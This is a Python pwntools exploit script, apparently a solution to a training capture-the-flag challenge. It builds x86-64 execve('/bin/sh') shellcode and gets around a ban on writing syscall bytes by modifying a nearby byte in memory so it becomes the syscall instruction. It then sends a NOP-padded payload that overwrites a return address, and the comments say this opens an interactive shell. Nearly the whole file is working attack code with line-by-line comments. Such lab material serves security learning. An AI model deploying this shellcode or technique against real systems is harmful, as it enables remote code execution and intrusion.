from pwn import *
site = "training.jinblack.it"
port = 3101
r = remote (site, port)
#The key point in this challenge was to invoke a syscall without actually writing its bytes

CODE = '''
       mov rsp,0x00404080
       add rsp,0x100
       mov rbx,0x0068732f6e69622f
       push rbx
       mov rdi,rsp
       xor rbx,rbx
       push rbx
       mov rsi,rsp
       mov rdx,rsp
       mov rax, 0x3b
       mov rsp,0x004040bd
       pop rbx
       add rbx,0x100
       push rbx
       '''
       #mov rsp,0x00404080 <-- moving the buffer into the stack
       #add rsp,0x100 <-- adjusting rsp
       #mov rbx,0x0068732f6e69622f <-- loading /bin/sh
       #push rbx <-- pushing it to the stack as to have a ptr
       #mov rdi,rsp <-- moving the ptr in its place
       #xor rbx,rbx <-- creating a null ptr for the rest of the params
       #push rbx <-- pushing it, I have achieved a ptr
       #mov rsi,rsp <-- null ptr arg1
       #mov rdx,rsp <-- null ptr arg2
       #mov rax, 0x3b <-- execve code register
       #mov rsp,0x004040bd <-- this address contains the bytes of the "almost syscall"
       #pop rbx
       #add rbx,0x100
       #push rbx
shellcode= asm(CODE, arch="amd64")+b"\x0f\x04\x00\x00\x00\x00\x00\x00"
                                  # b"\x00\x00\x00\x00\x00\x00\x05\x0f"
payload = shellcode + b"\x90"*147+b"\x80\x40\x40\x00\x00\x00\x00\x00\x00"+b"\x90"*787#+b"\x0f\x05"

input("Press key to inject payload: ")
r.send(payload)

r.interactive()
#from this point on the connection opens a shell for stdin/stdout
